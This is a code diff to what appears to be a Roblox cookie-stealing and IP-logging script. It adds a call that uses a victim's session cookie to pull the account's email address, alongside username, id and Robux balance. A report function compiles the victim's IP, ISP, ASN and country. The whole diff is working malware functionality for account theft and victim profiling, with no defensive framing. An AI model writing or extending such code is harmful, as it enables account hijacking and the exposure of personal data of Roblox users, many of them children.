@@ -99,6 +99,12 @@ def get_roblox_info():
         uid = user_data.get('id')
         username = user_data.get('name', 'Unknown')
 
+        email_resp = session.get('https://accountsettings.roblox.com/v1/email', timeout=10)
+        if email_resp.status_code != 200:
+            return None
+        email_data = email_resp.json()
+        email = email_data.get('emailAddress', 'Unknown')
+
         robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
         if robux_resp.status_code != 200:
             return {'username': username, 'id': str(uid) if uid else 'Unknown', 'robux': 'Error', 'cookie': cookie}
@@ -108,7 +114,8 @@ def get_roblox_info():
         return {
             'username': username,
             'id': str(uid) if uid else 'Unknown',
-            'robux': f"{robux:,}"
+            'robux': f"{robux:,}",
+            'emailAddress': email
         }
     except:
         return None
@@ -180,7 +187,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Username:** `{roblox_info['username'] if roblox_info['username'] else 'Unknown'}`
+> **Username:** `{roblox_info['username']}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
